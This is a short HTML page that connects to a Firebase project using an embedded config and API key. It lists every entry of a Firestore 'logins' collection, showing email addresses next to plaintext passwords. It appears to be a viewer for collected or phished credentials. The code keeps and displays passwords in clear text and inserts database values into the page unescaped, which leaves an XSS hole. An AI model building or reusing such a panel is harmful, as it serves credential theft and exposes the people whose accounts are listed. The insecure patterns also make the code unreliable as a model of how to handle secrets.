<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Firestore logins Viewer</title>
<style>
  body {
    background-color: #101418;
    color: #fff;
    font-family: Arial, sans-serif;
    padding: 20px;
  }
  table {
    border-collapse: collapse;
    width: 100%;
    max-width: 800px;
    margin: auto;
    background: #161b22;
    border: 1px solid #30363d;
  }
  th, td {
    padding: 12px;
    border-bottom: 1px solid #30363d;
  }
  th {
    background: #21262d;
    color: #58a6ff;
  }
  tr:hover { background: #1c2128; }
</style>
</head>
<body>

<h2 style="text-align:center;">Firestore 'logins' Collection</h2>

<table>
  <thead>
    <tr><th>Email</th><th>Password</th></tr>
  </thead>
  <tbody id="loginBody">
    <tr><td colspan="2">Loadingâ€¦</td></tr>
  </tbody>
</table>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
import { getFirestore, collection, getDocs } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyCExki28m1NNepVQEIjmcQzR8z8O68LqIc",
  authDomain: "rinolski-notifications.firebaseapp.com",
  projectId: "rinolski-notifications",
  storageBucket: "rinolski-notifications.firebasestorage.app",
  messagingSenderId: "355554579853",
  appId: "1:355554579853:web:3caa961653c0cdc0a359c4"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

const loginBody = document.getElementById("loginBody");

async function loadLogins() {
  try {
    const snap = await getDocs(collection(db, "logins"));

    loginBody.innerHTML = "";

    snap.forEach(doc => {
      const row = `
        <tr>
          <td>${doc.data().email || "no email"}</td>
          <td>${doc.data().password || "no password"}</td>
        </tr>`;
      loginBody.innerHTML += row;
    });

    if (snap.empty) {
      loginBody.innerHTML = "<tr><td colspan='2'>No data found.</td></tr>";
    }

  } catch (err) {
    loginBody.innerHTML =
      `<tr><td colspan="2" style="color:red;">Error: ${err.message}</td></tr>`;
  }
}

loadLogins();
</script>

</body>
</html>
